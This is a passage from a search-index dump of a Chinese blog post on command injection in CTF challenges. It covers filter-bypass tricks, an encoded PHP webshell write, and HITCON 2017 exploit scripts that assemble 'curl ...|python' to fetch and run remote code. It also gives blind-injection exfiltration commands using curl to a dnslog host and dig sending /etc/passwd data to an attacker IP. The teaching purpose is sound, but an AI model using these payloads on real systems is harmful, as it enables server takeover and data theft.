\u53ef\u4ee5\u4f7f\u7528 %20(space) \u3001 %09(tab) \u3001 %3c(<) \u4ee5\u53ca + \u6765\u7ed5\u8fc7 4. \u82b1\u62ec\u53f7\u62d3\u5c55 {OS_COMMAND,ARGUMENT} \u5728 Linux bash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 {cat,/etc/passwd} \u6765\u7ed5\u8fc7 5. \u53d8\u91cf\u63a7\u5236 $ X=$'cat\\x20/flag'&&$X flag{xxx} $ X=$'cat\\x09/flag'&&$X flag{xxx} #\u8fd9\u91cc\\x3c\u4e0d\u53ef\u4ee5 6. \u91c7\u7528 [[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection) \u7ed5\u8fc7 $ c[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)at /fl[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)ag flag{xxx} $ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d id $ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d|$0 uid=0(root) gid=0(root) groups=0(root)","title":"\u7a7a\u683c\u7ed5\u8fc7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_30","text":"\u91c7\u7528\u53d8\u91cf $ a=l;b=s;$a$b bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ a=c;b=at;c=flag;$a$b $c flag{xxx} 2. \u7f16\u7801\u7ed5\u8fc7 $ echo \"Y2F0IC9mbGFn\"|base64 -d|bash flag{xxx} #base64_endcode(\"cat /flag\") => Y2F0IC9mbGFn #base64\u53ef\u80fd\u4f1a\u51fa\u73b0/ $ echo \"636174202f666c6167\" | xxd -r -p|bash #hex flag{xxx} $ $(printf \"\\154\\163\") #oct bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ $(cat /flag) bash: flag{xxx}: \u672a\u627e\u5230\u547d\u4ee4 $ $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") flag{xxx} $ {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|$0 flag{xxx} #\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u6765\u5199webshell,\u5185\u5bb9\u4e3a<?php @eval($_POST['c']);?> $ {printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} >> 1.php 3. \u5355\u5f15\u53f7\u53cc\u5f15\u53f7 $ c\"a\"t /f''l'a'g flag{xxx} 4. \u53cd\u659c\u7ebf $ c\\a\\t /f\\l\\ag flag{xxx} 5. \u5229\u7528\u5df2\u7ecf\u5b58\u5728\u7684\u8d44\u6e90 $ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ echo $PATH| cut -c 1 / 6. \u5229\u7528\u4e00\u4e9b\u5df2\u6709\u5b57\u7b26 * ${PS2} \u5bf9\u5e94\u5b57\u7b26 `>` * ${PS4} \u5bf9\u5e94\u5b57\u7b26 `+` * ${IFS} \u5bf9\u5e94 \u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26 * ${9} \u5bf9\u5e94 \u7a7a\u5b57\u7b26\u4e32","title":"\u9ed1\u540d\u5355\u7ed5\u8fc7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_31","text":"","title":"\u4e3e\u4e2a\u4f8b\u5b50"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_32","text":"\u9996\u5148\u6309\u7167\u524d\u9762\u7684 > \u7684\u7528\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u6709\u6807\u51c6\u8f93\u51fa\u53ef\u4ee5\u8f93\u51fa\u5230\u6587\u4ef6\uff0c\u6240\u4ee5 \u8fd9\u91cc\u6211\u4eec\u6709\u4e24\u79cd\u6784\u9020\u65b9\u5f0f: \u53ea\u7528 \\ \u5206\u884c\u8f93\u5165\uff0c\u8fd9\u4e2a\u4f18\u70b9\u662f\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u65f6\u95f4\u987a\u5e8f\uff0c\u76f4\u63a5\u7528 ls>a \u8f93\u51fa\u5230 a \u6587\u4ef6\uff0c\u8fd9\u91cc\u53ef\u80fd\u6709\u4e00\u70b9\u8bef\u89e3\uff0c\u8fd9\u91cc\u662f\u8f93\u5165 $ >ec\\ ho\\ \\ 1 #\u8fd9\u4e2a\u65b9\u6cd5\u524d\u9762\u4e0d\u9700\u8981\u52a0>\uff0c\u6700\u540e\u7528\\\u8f6c\u4e49\u7a7a\u683c \u4f7f\u7528 \\\\ \uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u5229\u7528 \\ \u6765\u62fc\u63a5\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d\u524d\u4e00\u4e2a \\ \u662f\u7528\u6765\u8f6c\u4e49\u540e\u4e00\u4e2a \\ \u7684\u3002\u8fd9\u91cc\u9700\u8981\u8003\u8651\u65f6\u95f4\u987a\u5e8f\uff0c\u9700\u8981\u9006\u5e8f\u6765\u521b\u5efa\u6587\u4ef6\u3002","title":"\u77ed\u547d\u4ee4\u6267\u884c"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-1_1","text":"\u8fd9\u91cc\u662f\u4e2ap\u725b\u51fa\u7684\u9898 <?php if(strlen($_GET[1])<8){ echo shell_exec($_GET[1]); } ?> \u6211\u4eec\u53ef\u4ee5\u5206\u522b\u901a\u8fc7\u53d1\u9001 ?1=>hp ?1=>ell.p\\\\ ?1=>\\ sh\\\\ ?1=>\\ -O\\\\ ?1=>com\\\\ ?1=>x.\\\\ ?1=>\\ xx\\\\ ?1=>wget\\\\ ?1=ls -t>a ?1=sh a \u4e5f\u5c31\u662f\u6211\u4eec\u4e0a\u8ff0\u7684\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u5199\u5165\u4e00\u4e2a a \u6587\u4ef6\uff0c\u5176\u4e2d xxx.com \u53ef\u4ee5\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u57df\u540d\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u4e0d\u80fd\u4ee5 . \u5f00\u5934\uff0c\u56e0\u4e3a ls -t>a \u65e0\u6cd5\u5c06\u9690\u85cf\u6587\u4ef6\u540d\u5199\u5165 a \u3002 \u8d34\u4e00\u4e0bp\u725b\u7684\u811a\u672c #!/usr/bin/python3 #-*- coding: utf-8 -*- import requests def GetShell(): url = \"http://192.168.56.129/shell.php?1=\" fileNames = [\"1.php\",\"-O\\ \\\\\",\"cn\\ \\\\\",\"\\ a.\\\\\",\"wget\\\\\"] # linux\u521b\u5efa\u4e2d\u95f4\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u9700\u8981\u8f6c\u4e49\uff0c\u6240\u4ee5\u6709\u8bf7\u6c42\"cn\\ \\\\\" # \u53ef\u4ee5\u4fee\u6539hosts\u6587\u4ef6\uff0c\u8ba9a.cn\u6307\u5411\u4e00\u4e2a\u81ea\u5df1\u7684\u670d\u52a1\u5668\u3002 # \u5728a.cn \u7684\u6839\u76ee\u5f55\u4e0b\u521b\u5efaindex.html \uff0c\u5185\u5bb9\u662f\u4e00\u4e2aphp shell for fileName in fileNames: createFileUrl = url+\">\"+fileName print createFileUrl requests.get(createFileUrl) getShUrl = url + \"ls -t>1\" print getShUrl requests.get(getShUrl) getShellUrl = url + \"sh 1\" print getShellUrl requests.get(getShellUrl) shellUrl = \"http://192.168.56.129/1.php\" response = requests.get(shellUrl) if response.status_code == 200: print \"[*] Get shell !\" else : print \"[*] fail!\" if __name__ == \"__main__\": GetShell()","title":"Example 1 \u4e03\u5b57\u7ed5\u8fc7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-2-hitcon-ctf-2017-babyfirst-revenge","text":"\u6e90\u7801: <?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); \u8fd9\u91cc\u9700\u8981\u6211\u4eec\u6ce8\u610f\u7684\u662f cmd <= 5 \uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4e0d\u80fd\u5728\u4f7f\u7528 ls -t>a \u3002 \u4f46\u662f\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83\u5de7\u5999\u7684\u6784\u9020\u6765\u5b9e\u73b0 ls -t>a \u8fd9\u4e48\u4e00\u4e2a\u64cd\u4f5c\u7684\u3002\u53ef\u4ee5\u5148\u901a\u8fc7\u628a ls -t>a \u8fd9\u6837\u62c6\u5206\u6210\u51e0\u6bb5\u5199\u5165\u5230 _ \u6587\u4ef6\u5b58\u653e\u3002 \u4ece\u56fe\u4e2d\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230 _ \u91cc\u9762\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u884c\u65e0\u6548\u547d\u4ee4\uff0c2-5\u884c\u56e0\u4e3a\u672b\u5c3e\u6709 \\ \u8fde\u63a5\u5b57\u7b26\u7684\u5b58\u5728\u6240\u4ee5\u53ef\u4ee5\u8fde\u63a5\u5b57\u7b26\u4e32\u5f62\u6210 ls -t>g \uff0c\u6700\u540e\u4e00\u884c\u6267\u884c ls \u3002\u6240\u4ee5 sh _ \u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u76ee\u5f55 ls -t>g \u7684\u6548\u679c\u3002\u8fbe\u5230\u4e0e Example 1 \u4e00\u81f4\u7684\u6548\u679c\uff0c\u5176\u4ed6\u6b65\u9aa4\u4e0e Example 1 \u7c7b\u4f3c\uff0c\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\u3002\u4e0b\u9762\u7ed9\u51fa Orange \u7684 exp import requests from time import sleep from urllib import quote payload = [ # generate `ls -t>g` file '>ls\\\\', 'ls>_', '>\\ \\\\', '>-t\\\\', '>\\>g', 'ls>>_', # generate `curl orange.tw.tw>python` # curl shell.0xb.pw|python '>on', '>th\\\\', '>py\\\\', '>\\|\\\\', '>pw\\\\', '>x.\\\\', '>xx\\\\', '>l.\\\\', '>el\\\\', '>sh\\\\', '>\\ \\\\', '>rl\\\\', '>cu\\\\', # exec 'sh _', 'sh g', ] # r = requests.get('http://localhost/tmp/?reset=1') for i in payload: assert len(i) <= 5 r = requests.get('http://localhost/tmp/?cmd=' + quote(i) ) print i sleep(0.2) \u76f8\u5173Writeup: HITCON CTF 2017-BabyFirst Revenge-writeup HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl) HITCON 2017 CTF BabyFirst Revenge HITCON CTF 2017 - BabyFirst Revenge (172 pts.) Hitcon CTF 2017 - Baby Revenge Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd) HITCON CTF 2017 BabyFirst Revenge & v2 writeup BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter","title":"Example 2 \u4e94\u5b57\u7ed5\u8fc7 [HITCON CTF 2017-BabyFirst Revenge]"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-3-hitcon-2017-babyfirst-revenge-v2","text":"\u6e90\u7801\uff1a <?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); ?> \u8fd9\u9898\u76f8\u6bd4\u4e4b\u524d\u53c8\u96be\u4e86\u4e00\u70b9\uff0c\u8fd9\u6b21\u662f cmd <= 4 \uff0c\u4f46\u662f\u539f\u7406\u8fd8\u662f\u4e00\u6837\u7684\u3002\u6211\u4eec\u8981\u5904\u7406\u7684\u95ee\u9898\u8fd8\u662f ls -t>g \u8fd9\u4e48\u4e00\u4e2a\u95ee\u9898\u3002\u7136\u540e\u56e0\u4e3a\u957f\u5ea6\u9650\u5236\uff0c\u5982\u679c\u6211\u4eec\u8fd8\u7528 \\\\ \u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fde\u63a5\u7684\u8bdd\uff0c\u53ea\u5269\u4e0b\u4e24\u4e2a\u5b57\u7b26\uff0c\u52a0\u4e0a\u6700\u5f00\u59cb\u5fc5\u987b\u8981\u7528 > \u521b\u5efa\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u5269\u4e0b\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u3002\u6240\u4ee5\u78b0\u5230\u9700\u8981\u8f6c\u4e49\u7a7a\u683c\u8fd9\u79cd\u5730\u65b9\u4f8b\u5982 Exmaple 2 \u4e2d\u7684 >\\ \\\\ \u8fd9\u91cc\u5c31\u4e0d\u80fd\u518d\u4f7f\u7528\u4e86\u3002\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u518d\u63d0\u4e00\u4e2a trick * \u76f8\u5f53\u4e8e $(dir *) ,\u6240\u4ee5\u8bf4\u5982\u679c\u6587\u4ef6\u540d\u5982\u679c\u662f\u547d\u4ee4\u7684\u8bdd\u5c31\u4f1a\u8fd4\u56de\u6267\u884c\u7684\u7ed3\u679c,\u4e4b\u540e\u7684\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002\u4f8b\u5982\uff1a \u6240\u4ee5\u56de\u5230\u9898\u76ee\uff0c\u5982\u679c\u6309\u7167\u987a\u5e8f\u53bb\u521b\u5efa\u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5982\u679c\u76f4\u63a5\u7528 * \u53bb\u6267\u884c\u7684\u8bdd\uff0c\u53d1\u73b0\u5e76\u4e0d\u53ef\u4ee5\uff0c\u56e0\u4e3a\u6309\u7167 dir \u7684\u6587\u4ef6\u6392\u5e8f\uff0c -t \u4e5f\u662f\u6392\u5728\u6700\u524d\u9762\u3002 \u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981\u53c2\u8003\u4e00\u4e0b alphabetical \u6765\u6392\u5e8f\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8981\u7528 Docker \u6765\u505a\u4e86\uff0c\u56e0\u4e3a busybox \u91cc\u9762\u4e00\u4e9b\u4e1c\u897f\u8fd8\u662f\u8ddf\u771f\u5b9e\u73af\u5883\u4f18\u70b9\u533a\u522b\u7684\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u9700\u8981\u8fd0\u7528 - \u5b57\u7b26\u7684\u8bdd\uff0c\u4ed6\u4f1a\u6392\u5728\u6700\u524d\u9762\uff0c\u8fd9\u91cc\u5c31\u6bd4\u8f83\u5751\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u4e2a\u529e\u6cd5\u628a -t \u7f6e\u4e8e\u540e\u9762\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 t- \u8fd9\u79cd\u9006\u5e8f\u7684\u6a21\u5f0f\u628a t \u653e\u5230\u524d\u9762\u6765\uff0c\u5c31\u53ef\u4ee5\u6bd4\u8f83\u6b63\u5e38\u7684\u6392\u5e8f\u4e86\u3002 \u9006\u5e8f\u7684\u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u7528 rev \u6765\u5b9e\u73b0\uff0c\u53e6\u5916\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u5b57\u6bcd\u6bd4\u8f83\u9760\u524d\u7684\u547d\u4ee4\u6765\u5c55\u793a\u5f53\u524d\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528 dir \u6765\u5c55\u793a\u5f53\u524d\u76ee\u5f55\uff0c\u540c\u65f6 d \u5b57\u6bcd\u4e5f\u6bd4\u8f83\u9760\u524d\uff0c\u4e0d\u8981\u50cf ls \u7279\u522b\u8003\u8651\u6392\u5e8f\u7684\u95ee\u9898\u3002\u6240\u4ee5\u6211\u4eec\u5927\u6982\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e48\u4e00\u4e2a\u5f62\u5f0f\u53bb\u6784\u9020 ls -t>g \u8fd9\u91cc\u53ef\u80fd\u6709\u51e0\u4e2a\u8ba9\u5927\u5bb6\u6bd4\u8f83\u7591\u60d1\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u4e3a\u4ec0\u4e48\u662f >ht- \uff0c\u4e2a\u4eba\u7406\u89e3\u662f\u56e0\u4e3a ls \u9006\u5e8f\u662f sl \uff0c s \u662f\u6392\u5728 t \u524d\u7684\uff0c\u5982\u679c\u4e0d\u52a0 h \uff0c t- \u4f1a\u5728 sl \u4e4b\u540e\uff0c\u800c\u4e14 ls -th \u4e0e ls -t \u6548\u679c\u662f\u4e00\u6837\u7684\uff0c\u7136\u540e\u6211\u4eec\u518d\u627e\u4e00\u4e2a h \u4e4b\u524d\u7684\u5b57\u6bcd\u505a\u8f93\u51fa\u6587\u4ef6\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd8\u6709\u4e00\u4e2a\u5730\u65b9\u5c31\u662f *v>x \uff0c\u4e4b\u524d\u6211\u4eec\u8bb2\u8fc7\u4e86\u901a\u914d\u7b26\u4ee5\u53ca * \u7684\u4f5c\u7528\uff0c\u8fd9\u91cc *v \u5c31\u76f8\u5f53\u4e8e $(dir *v)>x \uff0c dir *v \u8fd4\u56de\u7684\u5c31\u662f\u7ed3\u5c3e\u4e3a v \u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u5c31\u662f rev \u4e0e v \u4e24\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u53ea\u6709\u76f8\u5f53\u4e8e\u5148\u628a v \u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u9006\u5e8f\uff0c\u800c\u540e\u518d\u8f93\u5165\u5230 x \u6587\u4ef6\uff0c\u8fd9\u6837\u6574\u4e2a ls -t>g \u7684\u547d\u4ee4\u62fc\u51d1\u5c31\u5b8c\u6210\u4e86\uff0c\u63a5\u7740\u65b9\u6cd5\u5c31\u6709\u5f88\u591a\u79cd\u4e86\uff0c\u6bd4\u8f83\u7b80\u5355\u7684\u5c31\u662f\u76f4\u63a5 wget \u6216\u8005 curl \u4e00\u4e2a webshell \u5230\u670d\u52a1\u5668\u4e0a\u5c31\u597d\u4e86\uff0c\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\u3002 \u518d\u7ed9\u4e00\u4e2a Orange \u7684 exp import requests from time import sleep from urllib import quote payload = [ # generate \"g> ht- sl\" to file \"v\" '>dir', '>sl', '>g\\>', '>ht-', '*>v', # reverse file \"v\" to file \"x\", content \"ls -th >g\" '>rev', '*v>x', # generate \"curl orange.tw|python;\" '>\\;\\\\', '>on\\\\', '>th\\\\', '>py\\\\', '>\\|\\\\', '>tw\\\\', '>e.\\\\', '>ng\\\\', '>ra\\\\', '>o\\\\', '>\\ \\\\', '>rl\\\\', '>cu\\\\', # got shell 'sh x', 'sh g', ] r = requests.get('http://52.197.41.31/?reset=1') for i in payload: assert len(i) <= 4 r = requests.get('http://52.197.41.31/?cmd=' + quote(i) ) print i sleep(0.1) \u76f8\u5173Writeup: Baby First Revenge v2 (Via vim) by @bennofs [python] baby-exp.py How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2 HITCON CTF 2017 BabyFirst Revenge & v2 writeup","title":"Example 3 \u56db\u5b57\u7ed5\u8fc7 [HITCON 2017 BabyFirst Revenge v2]"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_33","text":"\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7684\u5927\u90e8\u5206\u90fd\u662f\u6709\u56de\u663e\u6216\u8005\u4e00\u90e8\u5206\u63d0\u793a\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u5f53\u6211\u4eec\u9047\u5230\u65e0\u56de\u663e\u7684\u547d\u4ee4\u6ce8\u5165\u7684\u65f6\u5019\u6211\u4eec\u53c8\u8981\u600e\u4e48\u529e\u5462\uff1f","title":"\u65e0\u56de\u663e\u7684\u547d\u4ee4\u6ce8\u5165"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#dns-log","text":"\u9879\u76ee\u5730\u5740\uff1a BugScanTeam/DNSLog \u5bf9\u4e8e\u4e00\u4e9b\u547d\u4ee4\u76f2\u6ce8\u7c7b\u7684\u6f0f\u6d1e\uff0c\u8fd9\u901a\u5e38\u662f\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a\u901a\u5e38\u51fa\u7ad9DNS\u6d41\u91cf\u4e0d\u4f1a\u88ab\u963b\u6b62\u53ef\u4ee5\u901a\u8fc7\uff0cDNSLog \u4e2d\u7684 WebLog \u90e8\u5206\u5c06\u5176\u8f6c\u5316\u4e3a\u6709\u56de\u663e\u7684\u547d\u4ee4\u6267\u884c\uff1a curl \"http://testhash.test.dnslog.link/?`whoami`\" \u8fd9\u4e2a\u7528\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u76f4\u63a5\u53bb\u67e5\u770b\u5bf9\u5e94\u7684\u8bb0\u5f55\u5c31\u597d\u4e86\u3002 \u6709\u65f6\u5019\u4f60\u9700\u8981\u7f16\u7801\u60f3\u8981\u8bfb\u51fa\u6765\u7684\u5185\u5bb9\uff0c\u8fd9\u6837\u624d\u4e0d\u4f1a\u7531\u4e8e\u4e00\u4e9b\u7a7a\u683c\u6216\u8005\u4ec0\u4e48\u5176\u4ed6\u5b57\u7b26\u5bfc\u81f4\u8bfb\u4e0d\u5b8c\u6574\u6570\u636e\u3002 \u8fd9\u91cc\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u547d\u4ee4\u6ce8\u5165\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e xss \u7b49\u5176\u4ed6\u4e00\u4e9b\u65e0\u56de\u663e\u7684\u653b\u51fb\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e2a\u8d70 udp \u6d41\u91cf\u7684\u793a\u4f8b Only OB DNS traffic (UDP/53) allowed and can exec commands? Use dig `cut -d: -s -f1 /etc/passwd | sed 10\\!d` @ip to offload file contents. \u670d\u52a1\u7aef\uff1a nc -l -n -vv -p 53 -u -k(\u5982\u679c\u4e0d\u652f\u6301-k\u4e5f\u53ef\u4ee5\u4e0d\u7528-k) Same: {dig,`{cut,-d:,-s,-f1,/etc/passwd}|{sed,2\\!d}`,@ip}","title":"DNS Log"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#sleep","text":"\u68c0\u6d4b\u662f\u5426\u6709\u547d\u4ee4\u6ce8\u5165\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528 sleep \uff0c\u5e76\u89c2\u5bdf\u5176\u6267\u884c\u65f6\u95f4\u662f\u5426\u589e\u52a0\u3002 $ time ruby ping.rb '8.8.8.8' PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.09s user 0.04s system 4% cpu 3.176 total $ time ruby ping.rb '8.8.8.8 && sleep 5' PING 8.8.8.8 (8.8.8.8): 56 data bytes ... 0.10s user 0.04s system 1% cpu 8.182 total \u53ef\u4ee5\u770b\u51fa\u5982\u679c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\uff0c\u6267\u884c\u65f6\u95f4\u4f1a\u6309\u7167\u6211\u4eec sleep \u7684\u53c2\u6570\u589e\u52a0\uff0c\u6211\u4eec\u8fd9\u91cc\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u524d\u9762\u5355\u5f15\u53f7\u4e0e\u53cc\u5f15\u53f7\u7684\u533a\u522b\uff0c\u4ee5\u4e0b\u90fd\u9700\u8981 \u53bb\u6389\u53cd\u659c\u6760 \uff08\u4e3b\u9898\u6709\u70b9\u602a \u547d\u4ee4 \u7ed3\u679c {% raw %} ping -c 4 8.8.8.8 sleep 5 {% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u547d\u4ee4\u884c\u4e2d\u3002 {% raw %} ping -c 4 \u201c8.8.8.8 sleep 5 \u201d {% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u590d\u6742\u7684\u5b57\u7b26\u4e32\u53cc\u5f15\u53f7\u4e4b\u95f4\u3002 {% raw %}ping -c 4 $(echo 8.8.8.8 sleep 5 ){% endraw %} sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u4f7f\u7528\u4e0d\u540c\u7b26\u53f7\u65f6\u3002 {% raw %}ping -c 4 \u20188.8.8.8 sleep 5 '{% endraw %} sleep\u547d\u4ee4\u4e0d\u6267\u884c\uff0c\u547d\u4ee4\u66ff\u6362\u5728\u7b80\u5355\u5b57\u7b26\u4e32\u4e2d\u4e0d\u8d77\u4f5c\u7528\uff08\u5355\u5f15\u53f7\u4e4b\u95f4\uff09\u3002 {% raw %}ping -c 4 echo 8.8.8.8 sleep 5``{% endraw %} sleep\u547d\u4ee4\u4e0d\u6267\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7b26\u53f7\u65f6\u547d\u4ee4\u66ff\u6362\u4e0d\u8d77\u4f5c\u7528\u3002 ping -c 4 8.8.8.8;sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u547d\u4ee4\u5728\u547d\u4ee4\u884c\u4e2d\u987a\u5e8f\u6267\u884c\u3002 ping -c 4 \u201c8.8.8.8;sleep 5\u201d sleep\u547d\u4ee4\u672a\u88ab\u6267\u884c\uff0c\u9644\u52a0\u547d\u4ee4\u88ab\u6ce8\u5165\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u8be5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9ping\u547d\u4ee4\u3002 ping -c 4 $(echo 8.8.8.8;sleep 5) sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u6392\u5e8f\u547d\u4ee4\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 ping -c 4 \u20188.8.8.8;sleep 5\u2019 sleep\u547d\u4ee4\u672a\u88ab\u6267\u884c\uff0c \u9644\u52a0\u547d\u4ee4\u88ab\u6ce8\u5165\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u8be5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9ping\u547d\u4ee4\u3002 ping -c 4 echo 8.8.8.8;sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u6392\u5e8f\u547d\u4ee4\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 ping -c 4 8.8.8.8 sleep 5 ping -c 4 \u201c8.8.8.8 sleep 5\u201d ping -c 4 $(echo 8.8.8.8 sleep 5) ping -c 4 \u20188.8.8.8 sleep 5\u2019 ping -c 4 echo 8.8.8.8 | sleep 5 sleep\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u7ba1\u9053\u8f93\u51fa\u5728\u547d\u4ee4\u66ff\u6362\u4e2d\u8d77\u4f5c\u7528\u3002 \u9664\u4e86\u63a2\u6d4b\u662f\u5426\u6709\u547d\u4ee4\u6ce8\u5165\u4e4b\u5916\uff0c sleep \u8fd8\u6709\u4e00\u4e2a\u53ef\u4ee5\u7528\u4e8e\u547d\u4ee4\u76f2\u6ce8\u7684\u65b9\u6cd5\u3002 sleep $(hostname | cut -c 1 | tr a 5) 1. \u6211\u4eec\u6267\u884c\u7684\u547d\u4ee4\u4e3a hostname \u3002\u6211\u4eec\u5047\u8bbe\u5b83\u8fd4\u56de hacker.local \u3002 2. \u5b83\u9700\u8981\u8f93\u51fa\u5e76\u5c06\u5176\u4f20\u9012\u7ed9 cut -c 1 \u3002\u8fd9\u5c06\u9009\u53d6 hacker.local \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26h\u3002 3. \u63a5\u7740\u901a\u8fc7tr\u547d\u4ee4\u5c06\u5b57\u7b26 a \u66ff\u6362\u4e3a5\u3002 4. 